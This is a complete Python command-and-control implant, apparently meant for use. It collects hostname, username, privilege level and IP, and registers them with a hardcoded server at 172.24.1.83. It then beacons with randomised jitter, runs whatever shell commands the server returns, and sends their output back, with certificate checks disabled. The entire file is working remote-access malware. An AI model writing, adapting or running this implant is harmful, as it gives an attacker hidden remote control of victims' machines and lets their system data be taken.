#!/usr/bin/env python3
"""
Cross-Platform C2 Implant - Working Version
Works on Windows, Linux, and macOS
"""

import subprocess
import requests
import json
import time
import socket
import platform
import os
import sys
import base64
import random
from datetime import datetime

try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except:
    pass

class C2Implant:
    def __init__(self, server_url):
        self.server_url = server_url
        self.agent_id = None
        self.running = True
        self.beacon_interval = 5
        self.jitter = 20
        self.working_dir = os.getcwd()
        self.os_type = platform.system()
        
    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def get_system_info(self):
        try:
            if self.os_type == "Windows":
                username = os.environ.get('USERNAME', 'unknown')
            else:
                username = os.environ.get('USER', os.environ.get('LOGNAME', 'unknown'))
        except:
            username = 'unknown'
        
        try:
            if self.os_type == "Windows":
                import ctypes
                privilege = "admin" if ctypes.windll.shell32.IsUserAnAdmin() != 0 else "user"
            else:
                privilege = "root" if os.geteuid() == 0 else "user"
        except:
            privilege = "unknown"
        
        return {
            "hostname": socket.gethostname(),
            "username": username,
            "os_type": self.os_type,
            "os_version": platform.version(),
            "os_release": platform.release(),
            "architecture": platform.machine(),
            "ip_address": self.get_local_ip(),
            "working_dir": self.working_dir,
            "privilege_level": privilege
        }
    
    def execute_command(self, command):
        try:
            if command.lower().startswith('cd '):
                path = command[3:].strip()
                try:
                    os.chdir(path)
                    self.working_dir = os.getcwd()
                    return "[+] Changed directory to: " + self.working_dir
                except Exception as e:
                    return "[-] Failed to change directory: " + str(e)
            
            if self.os_type == "Windows":
                result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30, cwd=self.working_dir)
            else:
                result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30, cwd=self.working_dir, executable='/bin/bash')
            
            output = result.stdout if result.stdout else result.stderr
            if not output:
                output = "[+] Command executed successfully (no output)"
            
            return output
            
        except subprocess.TimeoutExpired:
            return "[-] Command timed out after 30 seconds"
        except Exception as e:
            return "[-] Error: " + str(e)
    
    def register(self):
        try:
            info = self.get_system_info()
            
            response = requests.post(
                self.server_url + "/api/register",
                json=info,
                verify=False,
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                self.agent_id = data.get('agent_id')
                self.beacon_interval = data.get('sleep_time', 5)
                print("[+] Registered with ID: " + self.agent_id)
                return True
            else:
                print("[-] Registration failed")
                return False
                
        except Exception as e:
            print("[-] Registration error: " + str(e))
            return False
    
    def beacon(self):
        print("[*] Starting beaconing to " + self.server_url)
        
        while self.running:
            try:
                heartbeat = {
                    'agent_id': self.agent_id,
                    'timestamp': datetime.now().isoformat(),
                    'working_dir': self.working_dir
                }
                
                response = requests.post(
                    self.server_url + "/api/beacon",
                    json=heartbeat,
                    verify=False,
                    timeout=30
                )
                
                if response.status_code == 200:
                    tasks = response.json().get('tasks', [])
                    
                    for task in tasks:
                        print("[*] Received task: " + task.get('command', ''))
                        output = self.execute_command(task.get('command', ''))
                        
                        result = {
                            'agent_id': self.agent_id,
                            'task_id': task.get('id'),
                            'output': output,
                            'status': 'completed'
                        }
                        
                        requests.post(
                            self.server_url + "/api/task_result",
                            json=result,
                            verify=False,
                            timeout=30
                        )
                        
                        print("[+] Task completed")
                
                sleep_time = self.beacon_interval + random.randint(-self.jitter, self.jitter)
                sleep_time = max(1, sleep_time)
                time.sleep(sleep_time)
                
            except Exception as e:
                print("[-] Beacon error: " + str(e))
                time.sleep(30)
    
    def run(self):
        print("[*] C2 Implant starting on " + self.os_type)
        print("[*] Server URL: " + self.server_url)
        
        if self.register():
            self.beacon()
        else:
            print("[-] Failed to register. Retrying in 60 seconds...")
            time.sleep(60)
            self.run()

if __name__ == '__main__':
    import ssl
    try:
        ssl._create_default_https_context = ssl._create_unverified_context
    except:
        pass
    
    SERVER_URL = "https://172.24.1.83:443"
    implant = C2Implant(SERVER_URL)
    implant.run()
